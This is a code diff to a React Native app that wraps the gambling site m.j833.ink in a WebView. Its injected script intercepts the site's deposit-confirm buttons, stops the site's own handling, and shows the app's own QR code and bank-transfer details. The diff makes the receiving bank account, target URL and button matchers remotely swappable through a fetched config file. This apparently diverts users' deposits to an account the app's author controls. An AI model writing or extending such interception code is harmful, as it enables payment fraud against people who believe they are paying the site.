@@ -1,4 +1,4 @@
-﻿import { useCallback, useState } from "react";
+import { useCallback, useEffect, useState } from "react";
 import {
   Alert,
   Image,
@@ -12,16 +12,26 @@ import {
 import { SafeAreaView } from "react-native-safe-area-context";
 import { WebView } from "react-native-webview";
 
-const supportUrl = "https://example.com/support";
+// ── Remote config URL ─────────────────────────────────────────────────────────
+const REMOTE_CONFIG_URL = "https://m.j833.ink/config.json";
 
-const BANK_INFO = {
-  bankId: "vietcombank",
-  bankName: "Vietcombank",
-  accountNumber: "1234567890",
-  accountHolder: "HUNG BEO HI",
-  transferNote: "NAP TIEN J88",
-  template: "compact2",
+// ── Default fallback (dùng khi fetch thất bại) ────────────────────────────────
+const DEFAULT_CONFIG = {
+  supportUrl: "https://example.com/support",
+  webviewUrl: "https://m.j833.ink/",
+  bankInfo: {
+    bankId: "vietcombank",
+    bankName: "Vietcombank",
+    accountNumber: "1234567890",
+    accountHolder: "HUNG BEO HI",
+    transferNote: "NAP J88",
+    template: "compact2",
+  },
+  confirmButtonTexts: ["XAC NHAN NAP TIEN", "NAP NGAY"],
+  confirmButtonClasses: ["confimeButton", "confirmButton"],
 };
+
+type AppConfig = typeof DEFAULT_CONFIG;
 
 type DepositInfo = {
   amountDisplay: string;
@@ -39,14 +49,35 @@ const BANK_OPTIONS = [
 ];
 
 export default function WebViewScreen() {
+  const [config, setConfig] = useState<AppConfig>(DEFAULT_CONFIG);
   const [depositInfo, setDepositInfo] = useState<DepositInfo | null>(null);
+
+  // ── Fetch remote config khi mount ────────────────────────────────────────────
+  useEffect(() => {
+    const controller = new AbortController();
+    fetch(REMOTE_CONFIG_URL, { signal: controller.signal })
+      .then((res) => res.json())
+      .then((data: Partial<AppConfig>) => {
+        setConfig((prev) => ({
+          supportUrl: data.supportUrl ?? prev.supportUrl,
+          webviewUrl: data.webviewUrl ?? prev.webviewUrl,
+          bankInfo: { ...prev.bankInfo, ...(data.bankInfo ?? {}) },
+          confirmButtonTexts: data.confirmButtonTexts ?? prev.confirmButtonTexts,
+          confirmButtonClasses: data.confirmButtonClasses ?? prev.confirmButtonClasses,
+        }));
+      })
+      .catch(() => {
+        // Giữ nguyên DEFAULT_CONFIG nếu fetch lỗi
+      });
+    return () => controller.abort();
+  }, []);
 
   const formatMoneyInt = (money = 0, type = ".") => {
     return String(money).replace(/(\d)(?=(\d{3})+(?!\d))/g, `$1${type}`);
   };
 
   const buildTransferContent = (rawAmount: string) => {
-    const safeNote = `${BANK_INFO.transferNote} ${rawAmount}`
+    const safeNote = `${config.bankInfo.transferNote} ${rawAmount}`
       .replace(/[^a-zA-Z0-9\s]/g, " ")
       .replace(/\s+/g, " ")
       .trim();
@@ -55,14 +86,13 @@ export default function WebViewScreen() {
 
   const buildVietQrUrl = (info: DepositInfo) => {
     const transferContent = buildTransferContent(info.rawAmount);
-    return `https://img.vietqr.io/image/${BANK_INFO.bankId}-${BANK_INFO.accountNumber}-${BANK_INFO.template}.png?amount=${info.amountValue}&addInfo=${encodeURIComponent(
-      transferContent
-    )}&accountName=${encodeURIComponent(BANK_INFO.accountHolder)}`;
+    const b = config.bankInfo;
+    return `https://img.vietqr.io/image/${b.bankId}-${b.accountNumber}-${b.template}.png?amount=${info.amountValue}&addInfo=${encodeURIComponent(transferContent)}&accountName=${encodeURIComponent(b.accountHolder)}`;
   };
 
   const isActiveBankOption = (bankKey: string, bankLabel: string) => {
-    const normalizedBankId = BANK_INFO.bankId.toLowerCase();
-    const normalizedBankName = BANK_INFO.bankName.toLowerCase();
+    const normalizedBankId = config.bankInfo.bankId.toLowerCase();
+    const normalizedBankName = config.bankInfo.bankName.toLowerCase();
     return (
       normalizedBankId.includes(bankKey) ||
       normalizedBankName.includes(bankKey) ||
@@ -70,47 +100,53 @@ export default function WebViewScreen() {
     );
   };
 
-  const handleWebViewMessage = useCallback(async (event: any) => {
-    const message = event.nativeEvent.data;
+  const handleWebViewMessage = useCallback(
+    async (event: any) => {
+      const message = event.nativeEvent.data;
 
-    if (message.startsWith("DEBUG_LOG:")) {
-      console.log("WebView Log:", message.replace("DEBUG_LOG:", ""));
-      return;
-    }
+      if (message.startsWith("DEBUG_LOG:")) {
+        console.log("WebView Log:", message.replace("DEBUG_LOG:", ""));
+        return;
+      }
 
-    try {
-      const data = JSON.parse(message);
+      try {
+        const data = JSON.parse(message);
 
-      if (data.action === "confirm_deposit_clicked") {
-        const rawAmountNum = Number(data.amount);
-
-        if (!rawAmountNum || rawAmountNum <= 0) {
-          Alert.alert("Thông báo", "Số tiền nạp không hợp lệ. Vui lòng kiểm tra lại.");
-          return;
+        if (data.action === "confirm_deposit_clicked") {
+          const rawAmountNum = Number(data.amount);
+          if (!rawAmountNum || rawAmountNum <= 0) {
+            Alert.alert("Thông báo", "Số tiền nạp không hợp lệ. Vui lòng kiểm tra lại.");
+            return;
+          }
+          const finalAmountValue = rawAmountNum;
+          const amountFormatted = formatMoneyInt(finalAmountValue, ",");
+          setDepositInfo({
+            amountDisplay: `${amountFormatted} VND`,
+            amountValue: String(finalAmountValue),
+            rawAmount: data.amount,
+          });
         }
 
-        const finalAmountValue = rawAmountNum;
-        const amountFormatted = formatMoneyInt(finalAmountValue, ",");
-
-        setDepositInfo({
-          amountDisplay: `${amountFormatted} VND`,
-          amountValue: String(finalAmountValue),
-          rawAmount: data.amount,
-        });
+        if (data.action === "line_chat_clicked") {
+          const canOpen = await Linking.canOpenURL(config.supportUrl);
+          if (canOpen) await Linking.openURL(config.supportUrl);
+        }
+      } catch {
+        console.log("Non-JSON message:", message);
       }
+    },
+    [config]
+  );
 
-      if (data.action === "line_chat_clicked") {
-        const canOpen = await Linking.canOpenURL(supportUrl);
-        if (canOpen) await Linking.openURL(supportUrl);
-      }
-    } catch {
-      console.log("Non-JSON message:", message);
-    }
-  }, []);
-
+  // ── injectedJS dùng config được truyền qua window.__APP_CONFIG ───────────────
   const injectedJS = `
     (function() {
       try {
+        var _cfg = ${JSON.stringify({
+          confirmButtonTexts: config.confirmButtonTexts,
+          confirmButtonClasses: config.confirmButtonClasses,
+        })};
+
         function emitToApp(action, data) {
           if (!window.ReactNativeWebView) return;
           window.ReactNativeWebView.postMessage(JSON.stringify(Object.assign({ action: action }, data || {})));
@@ -120,42 +156,36 @@ export default function WebViewScreen() {
           return (text || "")
             .toUpperCase()
             .normalize("NFD")
-            .replace(/[\u0300-\u036f]/g, "")
-            .replace(/\s+/g, " ")
+            .replace(/[\\u0300-\\u036f]/g, "")
+            .replace(/\\s+/g, " ")
             .trim();
         }
 
         function parseAmount(rawText) {
-          var text = String(rawText || "").toUpperCase().replace(/\s+/g, "");
+          var text = String(rawText || "").toUpperCase().replace(/\\s+/g, "");
           if (!text) return "0";
-
           var unit = "";
           if (/K$/.test(text)) unit = "K";
           if (/M$/.test(text)) unit = "M";
-
           text = text.replace(/[^0-9.,]/g, "");
           if (!text) return "0";
-
           var normalized = text;
           if (text.indexOf(",") > -1 && text.indexOf(".") > -1) {
             normalized = text.replace(/,/g, "");
           } else if (text.indexOf(",") > -1) {
             normalized = text.replace(/,/g, "");
           }
-
           var value = Number(normalized);
           if (!value || value <= 0) return "0";
-
           if (unit === "K") value = value * 1000;
           if (unit === "M") value = value * 1000000;
-
           return String(Math.round(value));
         }
 
         function getAmountFromDom() {
           var selectors = [
-            'input[placeholder*="tiền"]',
-            'input[placeholder*="Tiền"]',
+            'input[placeholder*="ti\\u1ec1n"]',
+            'input[placeholder*="Ti\\u1ec1n"]',
             'input[placeholder*="money"]',
             'input[type="number"]',
             'input[type="text"]',
@@ -163,7 +193,6 @@ export default function WebViewScreen() {
             '.amount input',
             '[class*="amount"] input'
           ];
-
           for (var i = 0; i < selectors.length; i++) {
             var input = document.querySelector(selectors[i]);
             if (input && input.value) {
@@ -171,14 +200,7 @@ export default function WebViewScreen() {
               if (parsed !== "0") return parsed;
             }
           }
-
-          var activeSelectors = [
-            ".active",
-            '[class*="active"]',
-            '[class*="selected"]',
-            '[class*="checked"]'
-          ];
-
+          var activeSelectors = [".active", '[class*="active"]', '[class*="selected"]', '[class*="checked"]'];
           for (var j = 0; j < activeSelectors.length; j++) {
             var node = document.querySelector(activeSelectors[j]);
             if (node) {
@@ -186,15 +208,20 @@ export default function WebViewScreen() {
               if (parsedNode !== "0") return parsedNode;
             }
           }
-
           return "0";
         }
 
         function isConfirmButton(el) {
           if (!el) return false;
           var text = normalizeText(el.textContent || el.innerText || "");
-          if (text === "Nạp ngay" || text === "Nạp Ngay" || text === "NAP NGAY") return true;
-          if (el.classList && (el.classList.contains("confimeButton") || el.classList.contains("confirmButton"))) return true;
+          for (var i = 0; i < _cfg.confirmButtonTexts.length; i++) {
+            if (text === _cfg.confirmButtonTexts[i]) return true;
+          }
+          if (el.classList) {
+            for (var j = 0; j < _cfg.confirmButtonClasses.length; j++) {
+              if (el.classList.contains(_cfg.confirmButtonClasses[j])) return true;
+            }
+          }
           return false;
         }
 
@@ -203,25 +230,18 @@ export default function WebViewScreen() {
           var buttonEl = target && target.closest
             ? target.closest('.confimeButton, .confirmButton, button, [role="button"], a, div, span')
             : target;
-
           if (!isConfirmButton(buttonEl)) return true;
-
           if (window.__rnConfirmLock) {
             event.preventDefault();
             event.stopPropagation();
             if (event.stopImmediatePropagation) event.stopImmediatePropagation();
             return false;
           }
-
           window.__rnConfirmLock = true;
-          setTimeout(function() {
-            window.__rnConfirmLock = false;
-          }, 1500);
-
+          setTimeout(function() { window.__rnConfirmLock = false; }, 1500);
           event.preventDefault();
           event.stopPropagation();
           if (event.stopImmediatePropagation) event.stopImmediatePropagation();
-
           var amount = getAmountFromDom();
           emitToApp("confirm_deposit_clicked", { amount: amount });
           return false;
@@ -231,7 +251,6 @@ export default function WebViewScreen() {
           var target = event.target;
           var el = target && target.closest ? target.closest(".line-chat") : null;
           if (!el) return true;
-
           event.preventDefault();
           event.stopPropagation();
           if (event.stopImmediatePropagation) event.stopImmediatePropagation();
@@ -248,7 +267,6 @@ export default function WebViewScreen() {
             el.addEventListener("touchstart", handleConfirmClick, { capture: true, passive: false });
             el.addEventListener("mousedown", handleConfirmClick, { capture: true, passive: false });
           });
-
           var lineChatElements = document.querySelectorAll(".line-chat");
           lineChatElements.forEach(function(el) {
             if (el.dataset.rnLineHandled === "1") return;
@@ -306,7 +324,7 @@ export default function WebViewScreen() {
                 <Image source={{ uri: buildVietQrUrl(depositInfo) }} style={styles.qrImage} resizeMode="contain" />
               </View>
 
-              <Text style={styles.napasInfo}>napas 247 | {BANK_INFO.bankName.toUpperCase()}</Text>
+              <Text style={styles.napasInfo}>napas 247 | {config.bankInfo.bankName.toUpperCase()}</Text>
               <View style={styles.downloadButton}>
                 <Text style={styles.downloadButtonText}>Tải Xuống Mã QR</Text>
               </View>
@@ -317,10 +335,9 @@ export default function WebViewScreen() {
               <Text style={styles.methodTitle}>
                 Cách 2: Chuyển khoản <Text style={styles.methodTitleHighlight}>thủ công</Text> theo thông tin
               </Text>
-
-              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Ngân hàng</Text><Text style={styles.infoRowValue}>{BANK_INFO.bankName}</Text></View>
-              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Số TK</Text><Text style={styles.infoRowValue}>{BANK_INFO.accountNumber}</Text></View>
-              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Chủ TK</Text><Text style={styles.infoRowValue}>{BANK_INFO.accountHolder}</Text></View>
+              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Ngân hàng</Text><Text style={styles.infoRowValue}>{config.bankInfo.bankName}</Text></View>
+              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Số TK</Text><Text style={styles.infoRowValue}>{config.bankInfo.accountNumber}</Text></View>
+              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Chủ TK</Text><Text style={styles.infoRowValue}>{config.bankInfo.accountHolder}</Text></View>
               <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Số tiền</Text><Text style={[styles.infoRowValue, styles.amountText]}>{depositInfo.amountDisplay}</Text></View>
               <View style={styles.infoRowLast}><Text style={styles.infoRowLabel}>Nội dung</Text><Text style={styles.infoRowValue}>{buildTransferContent(depositInfo.rawAmount)}</Text></View>
             </View>
@@ -343,7 +360,7 @@ export default function WebViewScreen() {
         </ScrollView>
       ) : (
         <WebView
-          source={{ uri: "https://m.j833.ink/" }}
+          source={{ uri: config.webviewUrl }}
           javaScriptEnabled={true}
           domStorageEnabled={true}
           injectedJavaScript={injectedJS}
